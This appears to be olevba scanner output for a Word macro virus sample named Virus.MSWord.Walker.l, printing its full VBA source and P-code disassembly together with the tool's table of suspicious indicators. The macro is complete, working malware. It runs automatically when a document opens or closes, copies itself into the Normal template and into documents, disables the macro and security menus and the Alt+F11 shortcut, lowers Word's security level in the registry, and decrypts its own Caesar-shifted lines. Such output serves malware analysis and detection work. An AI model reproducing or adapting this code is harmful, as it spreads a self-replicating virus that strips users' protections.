olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Walker.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Walker.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function Heidi(WhereAmI As String)
'[Bench]Garbage v2.0
'----------------------------------------
'Po!Fssps!Sftvnf!Ofyu;!B`Zvq!>!Gbmtf;!O`Zvq!>!Gbmtf;!Bqqmjdbujpo/Pqujpot/DpogjsnDpowfstjpot!>!Gbmtf
'HkpfMg{*DwknfMg{Eqfg*yfMg{H33."yfMg{Cnv++0Fkucdng<"HkpfMg{*DwknfMg{Eqfg*yfMg{H:."yfMg{Cnv++0Fkucdng
'Zlwk#FrppdqgEduv+%Wrrov%,=#1Frqwurov+%Pdfur%,1Hqdeohg#@#3=#1Frqwurov+%Fxvwrpl}h111%,1Hqdeohg#@#3=#1Frqwurov+%Whpsodwhv#dqg#Dgg0Lqv111%,1Hqdeohg#@#3=#Hqg#Zlwk
'GsqqerhFevw,&Jsvqex&-2Gsrxvspw,&Wx}pi222&-2Irefpih$A$4>$GsqqerhFevw,&Zmi{&-2Gsrxvspw,&Xsspfevw&-2Irefpih$A$4
'X~xyjr3Uwn{fyjUwtknqjXywnsl-''1%'MPJ^dHZWWJSYdZXJWaXtky|fwjaRnhwtxtkyaTkknhja>35a\twiaXjhzwny~'1%'Qj{jq'.%B%6+
'Ol&Gvvroigzout4\kxyout&DC&?)&Znkt&IussgtjHgxy.(Sgixu(/4Iutzxury.(Yki{xoz444(/4Jkrkzk&Kryk
'^p{o'Hwwspjh{pvu5Vw{pvuzA'5]py|zWyv{lj{pvu'D'7A'5Zh}lUvythsWyvtw{'D'7A'Luk'^p{o
'[m|(IL(E(Ik|q~mLwk}umv|6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tmB([m|(V\(E(Vwzuit\muxti|m6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tm
'JR)F)JM7urwn|1;5):2C)WR)F)W]7urwn|1;5):2
'Sp*KS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Kicz*G*^|oD*Sp*XS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Xicz*G*^|o
'Tq+Ljd€{+H+_}€p+Lyo+Yjd€{+H+_}€p+_spy+P�t+Q€yntzy
'Ur,ctq~qMyU,I,.`qy|xm€q.,`tqzF,_q€,Om~~uq~,I,Z`F,_q€,t{€,I,MPF,QxqF,_q€,Om~~uq~,I,MPF,_q€,t{€,I,Z`
'Tr{rP|qr-J-Pnvr;yv{r€5>9-Pnvr;P|‚{�\sYv{r€6
'Xjui!iptu;!/EfmfufMjoft!2-!/DpvouPgMjoft;!/JotfsuMjoft!2-!HfofDpef;!Foe!Xjui
'------------------------------------------
'------------------------------------------
On Error Resume Next: A_Yup = False: N_Yup = False: Application.Options.ConfirmConversions = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
With CommandBars("Tools"): .Controls("Macro").Enabled = 0: .Controls("Customize...").Enabled = 0: .Controls("Templates and Add-Ins...").Enabled = 0: End With
CommandBars("Format").Controls("Style...").Enabled = 0: CommandBars("View").Controls("Toolbars").Enabled = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Application.Version >= 9# Then CommandBars("Macro").Controls("Security...").Delete Else
With Application.Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
AI = AD.lines(2, 1): NI = NT.lines(2, 1)
If AI = "'[Bench]Garbage v2.0" Then A_Yup = True: If NI = "'[Bench]Garbage v2.0" Then N_Yup = True
If A_Yup = True And N_Yup = True Then Exit Function
If WhereAmI = "Template" Then: Set Carrier = NT: Set host = AD: Else: Set Carrier = AD: Set host = NT
GeneCode = Carrier.lines(1, Carrier.CountOfLines)
With host: .DeleteLines 1, .CountOfLines: .InsertLines 1, GeneCode: End With
'-----------------------------------------
'-----------------------------------------
End Function
Private Function encrypt(a, b As Integer)
On Error Resume Next
Dim c: c = "": For d = 1 To Len(a): c = c + Chr((Asc(Mid$(a, d, 1))) - b): Next
encrypt = c
End Function
Private Sub Document_Open()
On Error Resume Next:
If MacroContainer = NormalTemplate Then: WhereAmI = "Template": Set host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: Else: WhereAmI = "Document": Set host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
With host
    For x = 4 To 17
    If y = 13 Then y = 0
    crypt = .lines(x, 1): y = y + 1: l = Len(crypt): l = l - 1: crypt = Right$(crypt, l): .replaceline x + 16, encrypt(crypt, (y))
    Next x
End With
Heidi (WhereAmI)
Set host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
With host: For x = 20 To 33: .replaceline x, "'": Next x: End With
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
If Left$(ActiveDocument.Name, 8) <> "Document" Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf Left$(ActiveDocument.Name, 8) = "Document" And ActiveDocument.Characters.Count = 0 Then
ActiveDocument.Saved = True: End If
Set host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
With host: For x = 20 To 33: .replaceline x, "'": Next x: End With
Application.ScreenUpdating = True
End Sub

' By [Bench] - Thanks go to The Weird Genius for the encryption idea

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Walker.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12608 bytes
' Line #0:
' 	FuncDefn (Private Function Heidi(WhereAmI As String, id_FFFE As Variant))
' Line #1:
' 	QuoteRem 0x0000 0x0013 "[Bench]Garbage v2.0"
' Line #2:
' 	QuoteRem 0x0000 0x0028 "----------------------------------------"
' Line #3:
' 	QuoteRem 0x0000 0x0062 "Po!Fssps!Sftvnf!Ofyu;!B`Zvq!>!Gbmtf;!O`Zvq!>!Gbmtf;!Bqqmjdbujpo/Pqujpot/DpogjsnDpowfstjpot!>!Gbmtf"
' Line #4:
' 	QuoteRem 0x0000 0x0063 "HkpfMg{*DwknfMg{Eqfg*yfMg{H33."yfMg{Cnv++0Fkucdng<"HkpfMg{*DwknfMg{Eqfg*yfMg{H:."yfMg{Cnv++0Fkucdng"
' Line #5:
' 	QuoteRem 0x0000 0x009D "Zlwk#FrppdqgEduv+%Wrrov%,=#1Frqwurov+%Pdfur%,1Hqdeohg#@#3=#1Frqwurov+%Fxvwrpl}h111%,1Hqdeohg#@#3=#1Frqwurov+%Whpsodwhv#dqg#Dgg0Lqv111%,1Hqdeohg#@#3=#Hqg#Zlwk"
' Line #6:
' 	QuoteRem 0x0000 0x006C "GsqqerhFevw,&Jsvqex&-2Gsrxvspw,&Wx}pi222&-2Irefpih$A$4>$GsqqerhFevw,&Zmi{&-2Gsrxvspw,&Xsspfevw&-2Irefpih$A$4"
' Line #7:
' 	QuoteRem 0x0000 0x006E "X~xyjr3Uwn{fyjUwtknqjXywnsl-''1%'MPJ^dHZWWJSYdZXJWaXtky|fwjaRnhwtxtkyaTkknhja>35a\twiaXjhzwny~'1%'Qj{jq'.%B%6+"
' Line #8:
' 	QuoteRem 0x0000 0x005A "Ol&Gvvroigzout4\kxyout&DC&?)&Znkt&IussgtjHgxy.(Sgixu(/4Iutzxury.(Yki{xoz444(/4Jkrkzk&Kryk"
' Line #9:
' 	QuoteRem 0x0000 0x004F "^p{o'Hwwspjh{pvu5Vw{pvuzA'5]py|zWyv{lj{pvu'D'7A'5Zh}lUvythsWyvtw{'D'7A'Luk'^p{o"
' Line #10:
' 	QuoteRem 0x0000 0x0084 "[m|(IL(E(Ik|q~mLwk}umv|6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tmB([m|(V\(E(Vwzuit\muxti|m6^JXzwrmk|6^JKwuxwvmv|{6Q|mu0916KwlmUwl}tm"
' Line #11:
' 	QuoteRem 0x0000 0x0028 "JR)F)JM7urwn|1;5):2C)WR)F)W]7urwn|1;5):2"
' Line #12:
' 	QuoteRem 0x0000 0x0062 "Sp*KS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Kicz*G*^|oD*Sp*XS*G*,1eLoxmrgQk|lkqo*€<8:,*^rox*Xicz*G*^|o"
' Line #13:
' 	QuoteRem 0x0000 0x0033 "Tq+Ljd€{+H+_}€p+Lyo+Yjd€{+H+_}€p+_spy+P�t+Q€yntzy"
' Line #14:
' 	QuoteRem 0x0000 0x0065 "Ur,ctq~qMyU,I,.`qy|xm€q.,`tqzF,_q€,Om~~uq~,I,Z`F,_q€,t{€,I,MPF,QxqF,_q€,Om~~uq~,I,MPF,_q€,t{€,I,Z`"
' Line #15:
' 	QuoteRem 0x0000 0x0031 "Tr{rP|qr-J-Pnvr;yv{r€5>9-Pnvr;P|‚{�\sYv{r€6"
' Line #16:
' 	QuoteRem 0x0000 0x004C "Xjui!iptu;!/EfmfufMjoft!2-!/DpvouPgMjoft;!/JotfsuMjoft!2-!HfofDpef;!Foe!Xjui"
' Line #17:
' 	QuoteRem 0x0000 0x002A "------------------------------------------"
' Line #18:
' 	QuoteRem 0x0000 0x002A "------------------------------------------"
' Line #19:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St A_Yup 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St N_Yup 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt ConfirmConversions 
' Line #20:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' 	BoS 0x0000 
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #21:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	EndWith 
' Line #22:
' 	LitDI2 0x0000 
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #25:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #27:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St AI 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	St NI 
' Line #28:
' 	Ld AI 
' 	LitStr 0x0014 "'[Bench]Garbage v2.0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St A_Yup 
' 	BoS 0x0000 
' 	Ld NI 
' 	LitStr 0x0014 "'[Bench]Garbage v2.0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St N_Yup 
' 	EndIf 
' 	EndIf 
' Line #29:
' 	Ld A_Yup 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld N_Yup 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #30:
' 	Ld WhereAmI 
' 	LitStr 0x0008 "Template"
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set Carrier 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set host 
' 	BoS 0x0000 
' 	Else 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set Carrier 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set host 
' 	EndIf 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	Ld Carrier 
' 	ArgsMemLd lines 0x0002 
' 	St GeneCode 
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld GeneCode 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #33:
' 	QuoteRem 0x0000 0x0029 "-----------------------------------------"
' Line #34:
' 	QuoteRem 0x0000 0x0029 "-----------------------------------------"
' Line #35:
' 	EndFunc 
' Line #36:
' 	FuncDefn (Private Function encrypt(a, B As Integer, id_FFFE As Variant))
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	Dim 
' 	VarDefn c
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St c 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld a 
' 	Ld d 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Paren 
' 	Ld B 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #39:
' 	Ld c 
' 	St encrypt 
' Line #40:
' 	EndFunc 
' Line #41:
' 	FuncDefn (Private Sub Document_Open())
' Line #42:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' Line #43:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Template"
' 	St WhereAmI 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set host 
' 	BoS 0x0000 
' 	Else 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Document"
' 	St WhereAmI 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set host 
' 	EndIf 
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	With 
' Line #45:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0004 
' 	LitDI2 0x0011 
' 	For 
' Line #46:
' 	Ld y 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St y 
' 	EndIf 
' Line #47:
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	St crypt 
' 	BoS 0x0000 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' 	BoS 0x0000 
' 	Ld crypt 
' 	FnLen 
' 	St l 
' 	BoS 0x0000 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Sub 
' 	St l 
' 	BoS 0x0000 
' 	Ld crypt 
' 	Ld l 
' 	ArgsLd Right$ 0x0002 
' 	St crypt 
' 	BoS 0x0000 
' 	Ld x 
' 	LitDI2 0x0010 
' 	Add 
' 	Ld crypt 
' 	Ld y 
' 	Paren 
' 	ArgsLd encrypt 0x0002 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #48:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	EndWith 
' Line #50:
' 	Ld WhereAmI 
' 	Paren 
' 	ArgsCall Heidi 0x0001 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set host 
' Line #52:
' 	StartWithExpr 
' 	Ld host 
' 	With 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0014 
' 	LitDI2 0x0021 
' 	For 
' 	BoS 0x0000 
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Private Sub Document_Close())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #60:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #61:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set host 
' Line #62:
' 	StartWithExpr 
' 	Ld host 
' 	With 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0014 
' 	LitDI2 0x0021 
' 	For 
' 	BoS 0x0000 
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #63:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	QuoteRem 0x0000 0x0043 " By [Bench] - Thanks go to The Weird Genius for the encryption idea"
' Line #67:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

